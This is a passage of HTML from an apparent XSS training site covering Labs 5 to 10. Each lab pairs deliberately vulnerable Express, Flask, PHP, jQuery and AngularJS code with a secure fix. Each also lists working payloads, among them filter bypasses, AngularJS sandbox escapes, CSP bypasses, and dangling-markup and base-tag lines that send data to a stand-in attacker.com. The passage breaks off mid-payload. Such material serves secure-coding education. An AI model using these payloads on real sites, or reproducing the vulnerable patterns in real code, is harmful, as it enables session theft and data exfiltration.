                        <span class="meta-item"><i class="fas fa-tag"></i> Attribute, Event Handler</span>
                    </div>
                    <p class="lab-description">
                        User input is reflected inside an HTML attribute. Even with angle bracket encoding,
                        attackers can break out of the attribute and inject event handlers.
                    </p>
                </div>

                <div class="info-box">
                    <i class="fas fa-info-circle"></i>
                    <strong>Attribute Context:</strong> When input lands inside an attribute value, encoding &lt; and &gt;
                    isn't enough. Attackers can close the attribute with quotes and add event handlers.
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
                    <ul class="vuln-list">
                        <li>Input reflected inside HTML attribute (href, value, title, etc.)</li>
                        <li>Angle brackets may be encoded but quotes are not</li>
                        <li>Attacker closes attribute and injects event handler</li>
                        <li>Works even when angle brackets are fully blocked</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab5">
                            <i class="fas fa-bug"></i> Vulnerable Code
                        </button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab5">
                            <i class="fas fa-shield-alt"></i> Secure Code
                        </button>
                    </div>

                    <div class="code-container" id="lab5-vulnerable">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-node-js"></i> search.js (Express)</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript">const express = require('express');
const app = express();

app.get('/search', (req, res) => {
    const query = req.query.q || '';

<span class="vuln-line">    // Partial encoding - only angle brackets!</span>
<span class="vuln-line">    const encoded = query.replace(/</g, '&amp;lt;').replace(/>/g, '&amp;gt;');</span>

<span class="vuln-line">    // VULNERABLE: Input in attribute context, quotes not encoded</span>
<span class="vuln-line">    res.send(`</span>
<span class="vuln-line">        &lt;form action="/search"&gt;</span>
<span class="vuln-line">            &lt;input type="text" name="q" value="${encoded}"&gt;</span>
<span class="vuln-line">            &lt;button&gt;Search&lt;/button&gt;</span>
<span class="vuln-line">        &lt;/form&gt;</span>
<span class="vuln-line">    `);</span>
});

// Also vulnerable in href attributes
app.get('/profile', (req, res) => {
    const website = req.query.website || '#';
<span class="vuln-line">    // VULNERABLE: javascript: URLs possible</span>
<span class="vuln-line">    res.send(`&lt;a href="${website}"&gt;Visit Website&lt;/a&gt;`);</span>
});</code></pre>
                        </div>
                    </div>

                    <div class="code-container hidden" id="lab5-secure">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-node-js"></i> search.js (Express)</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript">const express = require('express');
const he = require('he'); // HTML entities library
const app = express();

app.get('/search', (req, res) => {
    const query = req.query.q || '';

<span class="secure-line">    // SECURE: Encode ALL special characters including quotes</span>
<span class="secure-line">    const encoded = he.encode(query);</span>

    res.send(`
        &lt;form action="/search"&gt;
<span class="secure-line">            &lt;input type="text" name="q" value="${encoded}"&gt;</span>
            &lt;button&gt;Search&lt;/button&gt;
        &lt;/form&gt;
    `);
});

// Secure href handling
app.get('/profile', (req, res) => {
    const website = req.query.website || '#';

<span class="secure-line">    // SECURE: Validate URL scheme</span>
<span class="secure-line">    const allowedSchemes = ['http:', 'https:'];</span>
<span class="secure-line">    let safeUrl = '#';</span>
<span class="secure-line">    </span>
<span class="secure-line">    try {</span>
<span class="secure-line">        const parsed = new URL(website);</span>
<span class="secure-line">        if (allowedSchemes.includes(parsed.protocol)) {</span>
<span class="secure-line">            safeUrl = he.encode(website);</span>
<span class="secure-line">        }</span>
<span class="secure-line">    } catch (e) {</span>
<span class="secure-line">        // Invalid URL, use default</span>
<span class="secure-line">    }</span>

    res.send(`&lt;a href="${safeUrl}"&gt;Visit Website&lt;/a&gt;`);
});</code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
                    <div class="payload-box">
                        <span class="payload-label">Break Attribute with Quote</span>
" onfocus="alert('XSS')" autofocus="
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Event Handler Injection</span>
" onmouseover="alert('XSS')
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Close Tag Completely</span>
"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">JavaScript URL (for href)</span>
javascript:alert('XSS')
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Accesskey Attribute (1-click)</span>
" accesskey="x" onclick="alert('XSS')
                    </div>
                </div>
            </div>

            <!-- Lab 6: XSS in JavaScript String -->
            <div id="lab6-javascript-string" class="lab-content hidden">
                <div class="lab-header">
                    <h2>Lab 6: Reflected XSS in JavaScript String Context</h2>
                    <div class="lab-meta">
                        <span class="meta-item"><i class="fas fa-signal"></i> Practitioner</span>
                        <span class="meta-item"><i class="fas fa-clock"></i> 15 minutes</span>
                        <span class="meta-item"><i class="fas fa-tag"></i> JavaScript, String Escape</span>
                    </div>
                    <p class="lab-description">
                        User input is embedded inside a JavaScript string. Attackers can break out of the
                        string and inject arbitrary JavaScript code.
                    </p>
                </div>

                <div class="info-box">
                    <i class="fas fa-info-circle"></i>
                    <strong>JavaScript Context:</strong> When input lands inside a JS string, HTML encoding won't help.
                    You need JavaScript string escaping to prevent breaking out of the string.
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
                    <ul class="vuln-list">
                        <li>User input placed inside JavaScript string literal</li>
                        <li>HTML encoding doesn't prevent breaking out of JS strings</li>
                        <li>Attacker closes string with quote and injects code</li>
                        <li>Need JS-specific escaping or avoid inline scripts entirely</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab6">
                            <i class="fas fa-bug"></i> Vulnerable Code
                        </button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab6">
                            <i class="fas fa-shield-alt"></i> Secure Code
                        </button>
                    </div>

                    <div class="code-container" id="lab6-vulnerable">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-python"></i> analytics.py</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-python">from flask import Flask, request
from markupsafe import escape

app = Flask(__name__)

@app.route('/track')
def track():
    referrer = request.args.get('ref', 'direct')

<span class="vuln-line">    # VULNERABLE: HTML escaping doesn't work in JS context!</span>
<span class="vuln-line">    html_escaped = escape(referrer)</span>

    return f'''
    &lt;html&gt;
    &lt;script&gt;
<span class="vuln-line">        // Tracking user source</span>
<span class="vuln-line">        var source = '{html_escaped}';</span>
<span class="vuln-line">        analytics.track('pageview', {{source: source}});</span>
    &lt;/script&gt;
    &lt;body&gt;Welcome!&lt;/body&gt;
    &lt;/html&gt;
    '''</code></pre>
                        </div>
                    </div>

                    <div class="code-container hidden" id="lab6-secure">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-python"></i> analytics.py</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-python">from flask import Flask, request
import json

app = Flask(__name__)

@app.route('/track')
def track():
    referrer = request.args.get('ref', 'direct')

<span class="secure-line">    # SECURE: Use JSON encoding for JavaScript context</span>
<span class="secure-line">    # json.dumps adds quotes and escapes special characters</span>
<span class="secure-line">    js_safe = json.dumps(referrer)</span>

    return f'''
    &lt;html&gt;
    &lt;script&gt;
<span class="secure-line">        var source = {js_safe};  // Note: json.dumps includes quotes</span>
        analytics.track('pageview', {{source: source}});
    &lt;/script&gt;
    &lt;body&gt;Welcome!&lt;/body&gt;
    &lt;/html&gt;
    '''

# Even better: Pass data via data attributes
@app.route('/track-secure')
def track_secure():
    referrer = request.args.get('ref', 'direct')
<span class="secure-line">    # HTML-encode for attribute, read in JS</span>
<span class="secure-line">    from markupsafe import escape</span>
<span class="secure-line">    return f'''</span>
<span class="secure-line">    &lt;body data-source="{escape(referrer)}"&gt;</span>
<span class="secure-line">    &lt;script&gt;</span>
<span class="secure-line">        var source = document.body.dataset.source;</span>
<span class="secure-line">        analytics.track('pageview', {{source: source}});</span>
<span class="secure-line">    &lt;/script&gt;</span>
<span class="secure-line">    &lt;/body&gt;'''</span></code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
                    <div class="payload-box">
                        <span class="payload-label">Break String with Single Quote</span>
'-alert('XSS')-'
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Close Script and Inject New One</span>
'&lt;/script&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">String Concatenation</span>
'+alert('XSS')+'
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Escape Backslash First</span>
\'-alert('XSS')//
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Unicode Escape Bypass</span>
\u0027-alert('XSS')-\u0027
                    </div>
                </div>
            </div>

            <!-- Lab 7: XSS with Tag Filtering -->
            <div id="lab7-tag-filtering" class="lab-content hidden">
                <div class="lab-header">
                    <h2>Lab 7: Reflected XSS with Tag and Attribute Filtering</h2>
                    <div class="lab-meta">
                        <span class="meta-item"><i class="fas fa-signal"></i> Practitioner</span>
                        <span class="meta-item"><i class="fas fa-clock"></i> 20 minutes</span>
                        <span class="meta-item"><i class="fas fa-tag"></i> WAF Bypass, Filter Evasion</span>
                    </div>
                    <p class="lab-description">
                        The application filters common XSS tags and attributes but can be bypassed using
                        lesser-known tags, event handlers, or encoding tricks.
                    </p>
                </div>

                <div class="info-box">
                    <i class="fas fa-info-circle"></i>
                    <strong>Filter Bypass:</strong> Blacklist-based filtering is almost always bypassable.
                    There are hundreds of HTML tags and event handlers that could execute JavaScript.
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
                    <ul class="vuln-list">
                        <li>Blacklist filtering only blocks known attack patterns</li>
                        <li>Many alternative tags can execute JavaScript (body, svg, details, etc.)</li>
                        <li>Event handlers beyond onclick/onerror often not blocked</li>
                        <li>Case variations, encoding, and null bytes can bypass filters</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab7">
                            <i class="fas fa-bug"></i> Vulnerable Code
                        </button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab7">
                            <i class="fas fa-shield-alt"></i> Secure Code
                        </button>
                    </div>

                    <div class="code-container" id="lab7-vulnerable">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-php"></i> sanitize.php</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-php">&lt;?php
function sanitizeInput($input) {
<span class="vuln-line">    // VULNERABLE: Blacklist-based filtering</span>
<span class="vuln-line">    $blocked_tags = ['script', 'javascript', 'onclick', 'onerror', 'onload'];</span>
<span class="vuln-line">    </span>
<span class="vuln-line">    foreach ($blocked_tags as $tag) {</span>
<span class="vuln-line">        $input = preg_replace("/$tag/i", '', $input);</span>
<span class="vuln-line">    }</span>
<span class="vuln-line">    </span>
<span class="vuln-line">    return $input;</span>
}

$query = $_GET['q'] ?? '';
$safe = sanitizeInput($query);

// Still vulnerable - many bypasses possible
echo "&lt;div&gt;Results for: $safe&lt;/div&gt;";

// Another flawed approach
function stripTags($input) {
<span class="vuln-line">    // VULNERABLE: Only strips specific tags</span>
<span class="vuln-line">    return preg_replace('/&lt;(script|iframe)[^&gt;]*&gt;.*?&lt;\/\1&gt;/is', '', $input);</span>
}
?&gt;</code></pre>
                        </div>
                    </div>

                    <div class="code-container hidden" id="lab7-secure">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-php"></i> sanitize.php</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-php">&lt;?php
<span class="secure-line">// SECURE: Whitelist approach - only allow known safe elements</span>
<span class="secure-line">require_once 'vendor/autoload.php';</span>
<span class="secure-line">use HTMLPurifier;</span>
<span class="secure-line">use HTMLPurifier_Config;</span>

function sanitizeInput($input) {
<span class="secure-line">    // Option 1: For plain text - escape everything</span>
<span class="secure-line">    return htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');</span>
}

function sanitizeRichText($input) {
<span class="secure-line">    // Option 2: For rich text - use HTMLPurifier with whitelist</span>
<span class="secure-line">    $config = HTMLPurifier_Config::createDefault();</span>
<span class="secure-line">    $config-&gt;set('HTML.Allowed', 'p,br,b,i,em,strong,a[href],ul,ol,li');</span>
<span class="secure-line">    $config-&gt;set('URI.AllowedSchemes', ['http' =&gt; true, 'https' =&gt; true]);</span>
<span class="secure-line">    $config-&gt;set('Attr.AllowedFrameTargets', []);</span>
<span class="secure-line">    </span>
<span class="secure-line">    $purifier = new HTMLPurifier($config);</span>
<span class="secure-line">    return $purifier-&gt;purify($input);</span>
}

$query = $_GET['q'] ?? '';
$safe = sanitizeInput($query);
echo "&lt;div&gt;Results for: $safe&lt;/div&gt;";
?&gt;</code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
                    <div class="payload-box">
                        <span class="payload-label">SVG Tag (often not blocked)</span>
&lt;svg onload=alert('XSS')&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Body Tag with Event</span>
&lt;body onpageshow=alert('XSS')&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Details/Summary Tags</span>
&lt;details open ontoggle=alert('XSS')&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Custom Tag with Event</span>
&lt;custom-tag onfocus=alert('XSS') tabindex=1&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Nested Tag Bypass</span>
&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;/script&gt;ipt&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Case Manipulation</span>
&lt;ScRiPt&gt;alert('XSS')&lt;/sCrIpT&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Less Common Event Handlers</span>
&lt;input onfocusin=alert('XSS') autofocus&gt;
&lt;marquee onstart=alert('XSS')&gt;
&lt;video&gt;&lt;source onerror=alert('XSS')&gt;
                    </div>
                </div>
            </div>

            <!-- Lab 8: DOM XSS in jQuery -->
            <div id="lab8-dom-jquery" class="lab-content hidden">
                <div class="lab-header">
                    <h2>Lab 8: DOM XSS in jQuery Selector Sink</h2>
                    <div class="lab-meta">
                        <span class="meta-item"><i class="fas fa-signal"></i> Apprentice</span>
                        <span class="meta-item"><i class="fas fa-clock"></i> 15 minutes</span>
                        <span class="meta-item"><i class="fas fa-tag"></i> DOM, jQuery</span>
                    </div>
                    <p class="lab-description">
                        The application uses jQuery's $() function with user-controlled data. jQuery can
                        create and execute elements when passed HTML strings instead of selectors.
                    </p>
                </div>

                <div class="info-box">
                    <i class="fas fa-info-circle"></i>
                    <strong>jQuery Sinks:</strong> $(userInput) can create elements if input starts with &lt;.
                    Also dangerous: .html(), .append(), .prepend(), .after(), .before(), .replaceWith()
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
                    <ul class="vuln-list">
                        <li>jQuery $() creates elements if string starts with HTML tag</li>
                        <li>location.hash often used with jQuery for SPA navigation</li>
                        <li>.html() and similar methods parse HTML without sanitization</li>
                        <li>attr('href') with javascript: URLs also dangerous</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab8">
                            <i class="fas fa-bug"></i> Vulnerable Code
                        </button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab8">
                            <i class="fas fa-shield-alt"></i> Secure Code
                        </button>
                    </div>

                    <div class="code-container" id="lab8-vulnerable">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-js"></i> navigation.js</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript">// jQuery-based SPA navigation
$(document).ready(function() {
    // Handle hash changes for navigation
    $(window).on('hashchange', function() {
        var hash = location.hash.slice(1);

<span class="vuln-line">        // VULNERABLE: jQuery selector with user input</span>
<span class="vuln-line">        // If hash is "&lt;img src=x onerror=alert(1)&gt;" it creates element!</span>
<span class="vuln-line">        $(hash).show();</span>
    });

    // Load content dynamically
    var returnUrl = $.urlParam('returnUrl');
<span class="vuln-line">    // VULNERABLE: Setting href with user input</span>
<span class="vuln-line">    $('a.back-link').attr('href', returnUrl);</span>
});

// Display user feedback
function showMessage(msg) {
<span class="vuln-line">    // VULNERABLE: .html() with user content</span>
<span class="vuln-line">    $('#message').html(msg);</span>
}

// Tooltip from URL
var tooltip = new URLSearchParams(location.search).get('tooltip');
<span class="vuln-line">$('#info').html(tooltip);</span></code></pre>
                        </div>
                    </div>

                    <div class="code-container hidden" id="lab8-secure">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-js"></i> navigation.js</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript">// Secure jQuery patterns
$(document).ready(function() {
    // Valid section IDs
    const validSections = ['home', 'about', 'contact', 'products'];

    $(window).on('hashchange', function() {
        var hash = location.hash.slice(1);

<span class="secure-line">        // SECURE: Validate against whitelist</span>
<span class="secure-line">        if (validSections.includes(hash)) {</span>
<span class="secure-line">            // Use ID selector explicitly</span>
<span class="secure-line">            $('#' + hash).show();</span>
<span class="secure-line">        }</span>
    });

    // Secure URL handling
    var returnUrl = $.urlParam('returnUrl');
<span class="secure-line">    // SECURE: Validate URL scheme</span>
<span class="secure-line">    try {</span>
<span class="secure-line">        const url = new URL(returnUrl, location.origin);</span>
<span class="secure-line">        if (url.protocol === 'https:' || url.protocol === 'http:') {</span>
<span class="secure-line">            $('a.back-link').attr('href', url.href);</span>
<span class="secure-line">        }</span>
<span class="secure-line">    } catch (e) {</span>
<span class="secure-line">        // Invalid URL, use default</span>
<span class="secure-line">    }</span>
});

// Display message securely
function showMessage(msg) {
<span class="secure-line">    // SECURE: Use .text() for plain text</span>
<span class="secure-line">    $('#message').text(msg);</span>

<span class="secure-line">    // Or sanitize with DOMPurify for HTML</span>
<span class="secure-line">    // $('#message').html(DOMPurify.sanitize(msg));</span>
}</code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
                    <div class="payload-box">
                        <span class="payload-label">jQuery Selector Creates Element</span>
#&lt;img src=x onerror=alert('XSS')&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Hash-based Attack</span>
https://vulnerable.com/#&lt;img src=x onerror=alert(document.cookie)&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">JavaScript URL in href</span>
javascript:alert('XSS')
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">.html() Injection</span>
&lt;svg/onload=alert('XSS')&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">jQuery hashchange Exploit</span>
// If page has: $('section' + location.hash).show()
// Use: https://vulnerable.com/page#&lt;img src=x onerror=alert(1)&gt;
                    </div>
                </div>
            </div>

            <!-- Lab 9: XSS in AngularJS -->
            <div id="lab9-angularjs" class="lab-content hidden">
                <div class="lab-header">
                    <h2>Lab 9: DOM XSS in AngularJS Expression</h2>
                    <div class="lab-meta">
                        <span class="meta-item"><i class="fas fa-signal"></i> Practitioner</span>
                        <span class="meta-item"><i class="fas fa-clock"></i> 20 minutes</span>
                        <span class="meta-item"><i class="fas fa-tag"></i> AngularJS, Template Injection</span>
                    </div>
                    <p class="lab-description">
                        AngularJS processes expressions in double curly braces {{}}. When user input is
                        reflected in an Angular template, attackers can execute arbitrary JavaScript.
                    </p>
                </div>

                <div class="info-box">
                    <i class="fas fa-info-circle"></i>
                    <strong>Angular Sandbox:</strong> AngularJS 1.x has a sandbox that restricts expression evaluation,
                    but numerous sandbox escapes have been discovered over the years.
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
                    <ul class="vuln-list">
                        <li>AngularJS evaluates {{expression}} in the template</li>
                        <li>User input in Angular context allows template injection</li>
                        <li>Sandbox escapes allow accessing window object</li>
                        <li>Even HTML-encoded input gets processed by Angular</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab9">
                            <i class="fas fa-bug"></i> Vulnerable Code
                        </button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab9">
                            <i class="fas fa-shield-alt"></i> Secure Code
                        </button>
                    </div>

                    <div class="code-container" id="lab9-vulnerable">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-html5"></i> search.html</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-html">&lt;!-- AngularJS 1.x application --&gt;
&lt;html ng-app="searchApp"&gt;
&lt;head&gt;
    &lt;script src="angular.min.js"&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body ng-controller="SearchController"&gt;
    &lt;form&gt;
        &lt;input type="text" ng-model="query"&gt;
        &lt;button ng-click="search()"&gt;Search&lt;/button&gt;
    &lt;/form&gt;

<span class="vuln-line">    &lt;!-- VULNERABLE: Server-side rendered user input in Angular template --&gt;</span>
<span class="vuln-line">    &lt;div class="results"&gt;</span>
<span class="vuln-line">        You searched for: {{ serverRenderedQuery }}</span>
<span class="vuln-line">    &lt;/div&gt;</span>

    &lt;script&gt;
    // Server injects user input directly
<span class="vuln-line">    var serverRenderedQuery = '{{ user_input }}';</span>

    angular.module('searchApp', [])
        .controller('SearchController', function($scope) {
            $scope.serverRenderedQuery = serverRenderedQuery;
        });
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
                        </div>
                    </div>

                    <div class="code-container hidden" id="lab9-secure">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-html5"></i> search.html</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-html">&lt;!-- Secure AngularJS patterns --&gt;
&lt;html ng-app="searchApp"&gt;
&lt;head&gt;
    &lt;script src="angular.min.js"&gt;&lt;/script&gt;
<span class="secure-line">    &lt;!-- Use CSP-compatible mode --&gt;</span>
<span class="secure-line">    &lt;meta http-equiv="Content-Security-Policy" </span>
<span class="secure-line">          content="default-src 'self'; script-src 'self'"&gt;</span>
&lt;/head&gt;
<span class="secure-line">&lt;!-- SECURE: Use ng-csp for CSP compatibility --&gt;</span>
<span class="secure-line">&lt;body ng-controller="SearchController" ng-csp&gt;</span>
    &lt;form&gt;
        &lt;input type="text" ng-model="query"&gt;
        &lt;button ng-click="search()"&gt;Search&lt;/button&gt;
    &lt;/form&gt;

<span class="secure-line">    &lt;!-- SECURE: Use ng-bind instead of interpolation --&gt;</span>
<span class="secure-line">    &lt;div class="results"&gt;</span>
<span class="secure-line">        You searched for: &lt;span ng-bind="query"&gt;&lt;/span&gt;</span>
<span class="secure-line">    &lt;/div&gt;</span>

    &lt;script&gt;
<span class="secure-line">    // SECURE: Pass data via JSON endpoint, not template</span>
    angular.module('searchApp', [])
        .controller('SearchController', function($scope, $http) {
<span class="secure-line">            // Fetch data via API instead of template injection</span>
<span class="secure-line">            $http.get('/api/search-data').then(function(response) {</span>
<span class="secure-line">                $scope.query = response.data.query;</span>
<span class="secure-line">            });</span>
        });
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
                    <div class="payload-box">
                        <span class="payload-label">Basic Angular Expression</span>
{{constructor.constructor('alert(1)')()}}
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Angular 1.6+ Sandbox Escape</span>
{{$on.constructor('alert(1)')()}}
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Angular &lt;1.6 Sandbox Escape</span>
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">orderBy Filter Exploit</span>
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">toString Sandbox Bypass</span>
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
                    </div>
                </div>
            </div>

            <!-- Lab 10: XSS with CSP Bypass -->
            <div id="lab10-csp-bypass" class="lab-content hidden">
                <div class="lab-header">
                    <h2>Lab 10: Reflected XSS with CSP Bypass</h2>
                    <div class="lab-meta">
                        <span class="meta-item"><i class="fas fa-signal"></i> Expert</span>
                        <span class="meta-item"><i class="fas fa-clock"></i> 30 minutes</span>
                        <span class="meta-item"><i class="fas fa-tag"></i> CSP, Policy Bypass</span>
                    </div>
                    <p class="lab-description">
                        The application has a Content Security Policy that blocks inline scripts, but
                        misconfigurations allow attackers to bypass the policy and execute JavaScript.
                    </p>
                </div>

                <div class="warning-box">
                    <i class="fas fa-exclamation-triangle"></i>
                    <strong>CSP Misconfigurations:</strong> Common bypasses include unsafe-inline, unsafe-eval,
                    JSONP endpoints, AngularJS libraries, and overly permissive source lists.
                </div>

                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
                    <ul class="vuln-list">
                        <li>'unsafe-inline' allows inline scripts (defeats most CSP protection)</li>
                        <li>Whitelisted domains may host exploitable endpoints (JSONP, Angular)</li>
                        <li>base-uri not set allows base tag injection</li>
                        <li>Dangling markup can exfiltrate data without scripts</li>
                    </ul>
                </div>

                <div class="code-review-section">
                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable" data-lab="lab10">
                            <i class="fas fa-bug"></i> Vulnerable Code
                        </button>
                        <button class="code-tab secure" data-view="secure" data-lab="lab10">
                            <i class="fas fa-shield-alt"></i> Secure Code
                        </button>
                    </div>

                    <div class="code-container" id="lab10-vulnerable">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-node-js"></i> server.js</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript">const express = require('express');
const app = express();

app.use((req, res, next) => {
<span class="vuln-line">    // VULNERABLE CSP: Too permissive</span>
<span class="vuln-line">    res.setHeader('Content-Security-Policy', </span>
<span class="vuln-line">        "default-src 'self'; " +</span>
<span class="vuln-line">        "script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com 'unsafe-eval'; " +</span>
<span class="vuln-line">        // Missing: base-uri, form-action, frame-ancestors</span>
<span class="vuln-line">    );</span>
    next();
});

// Another weak CSP pattern
app.get('/weak-csp', (req, res) => {
<span class="vuln-line">    // VULNERABLE: Using nonce but also unsafe-inline</span>
<span class="vuln-line">    res.setHeader('Content-Security-Policy',</span>
<span class="vuln-line">        "script-src 'nonce-random123' 'unsafe-inline'"</span>
<span class="vuln-line">    );</span>
    res.send(renderPage());
});

// JSONP endpoint - exploitable for CSP bypass
app.get('/api/jsonp', (req, res) => {
    const callback = req.query.callback;
<span class="vuln-line">    // VULNERABLE: No callback validation</span>
<span class="vuln-line">    res.send(`${callback}({"data": "value"})`);</span>
});</code></pre>
                        </div>
                    </div>

                    <div class="code-container hidden" id="lab10-secure">
                        <div class="code-header">
                            <span class="code-filename"><i class="fab fa-node-js"></i> server.js</span>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript">const express = require('express');
const crypto = require('crypto');
const app = express();

app.use((req, res, next) => {
<span class="secure-line">    // Generate unique nonce per request</span>
<span class="secure-line">    const nonce = crypto.randomBytes(16).toString('base64');</span>
<span class="secure-line">    res.locals.nonce = nonce;</span>

<span class="secure-line">    // SECURE: Strict CSP with nonce</span>
<span class="secure-line">    res.setHeader('Content-Security-Policy', [</span>
<span class="secure-line">        "default-src 'self'",</span>
<span class="secure-line">        `script-src 'nonce-${nonce}' 'strict-dynamic'`,</span>
<span class="secure-line">        "style-src 'self'",</span>
<span class="secure-line">        "img-src 'self' data:",</span>
<span class="secure-line">        "base-uri 'self'",</span>
<span class="secure-line">        "form-action 'self'",</span>
<span class="secure-line">        "frame-ancestors 'none'",</span>
<span class="secure-line">        "object-src 'none'",</span>
<span class="secure-line">        "require-trusted-types-for 'script'"</span>
<span class="secure-line">    ].join('; '));</span>

    next();
});

// SECURE: Use JSON API instead of JSONP
app.get('/api/data', (req, res) => {
<span class="secure-line">    res.json({ data: "value" });</span>
});

// If JSONP required, validate callback strictly
app.get('/api/jsonp-secure', (req, res) => {
    const callback = req.query.callback;
<span class="secure-line">    // SECURE: Whitelist callback names</span>
<span class="secure-line">    if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(callback)) {</span>
<span class="secure-line">        return res.status(400).json({ error: 'Invalid callback' });</span>
<span class="secure-line">    }</span>
    res.send(`${callback}({"data": "value"})`);
});</code></pre>
                        </div>
                    </div>
                </div>

                <div class="payload-section">
                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
                    <div class="payload-box">
                        <span class="payload-label">JSONP Callback Injection</span>
&lt;script src="https://vulnerable.com/api/jsonp?callback=alert"&gt;&lt;/script&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Angular CDN CSP Bypass</span>
&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"&gt;&lt;/script&gt;
&lt;div ng-app ng-csp&gt;{{$eval.constructor('alert(1)')()}}&lt;/div&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Base Tag Hijacking (if base-uri missing)</span>
&lt;base href="https://attacker.com/"&gt;
&lt;!-- All relative script sources now load from attacker.com --&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Dangling Markup (no script execution needed)</span>
&lt;img src="https://attacker.com/steal?data=
&lt;!-- Everything until next quote becomes part of URL --&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">CRLF Injection to Modify CSP</span>
